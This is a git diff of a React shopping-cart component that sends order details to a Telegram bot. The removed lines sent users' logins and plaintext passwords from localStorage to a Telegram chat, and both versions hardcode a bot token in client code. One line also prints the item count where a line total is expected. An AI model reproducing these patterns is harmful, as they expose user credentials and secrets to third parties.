@@ -15,22 +15,24 @@ const Korzinka = () => {
     const userCheck = JSON.parse(localStorage.getItem("auth"));
     if (userCheck) {
       axios.post(
-        `https://api.telegram.org/bot5965095346:AAEXQvzRcP8v4NGOgNsxth5ZCsawoS6-8vA/sendMessage?chat_id=-1001654400509&text=${encodeURIComponent(
+        `https://api.telegram.org/bot6293106942:AAEaqt2EHa8sphFx4IQzTotKDPka5wbWFs4/sendMessage?chat_id=-906037030&text=${encodeURIComponent(
           `<b>Details:</b>
       
           <b>The operation was completed successfully!</b>
           <b>our couriers will contact you soon! Ibrohim</b>
-          <b> Call Center: +998 99 946 45 99 </b>
-          <b> Name: ${userCheck.name} </b>
-          <b> User: ${userCheck.login} </b>
-          <b> Password: ${userCheck.pass} </b>
+          <b> Call Center: +998 93 667 75 59 </b>
+          <b> Zakaz qilingan ro'yhatlar  </b>
+          
           ${items
+            // <b> User: ${userCheck.login} </b>
+            // <b> Password: ${userCheck.pass} </b>
+            // <b> Name: ${userCheck.name} </b>
             .map((item) => {
-              return ` <b>${item.name}</b> ${item.count} x ${item.price} som = ${item.count} `;
+              return ` <b>${item.title}</b> ${item.count} x ${item.price} som = ${item.count} `;
             })
             .join("")}  
             
-            <b>Total:</b> ${total} $`
+            <b>Total:</b> ${total} som`
         )}&parse_mode=html`
       );
     } else {
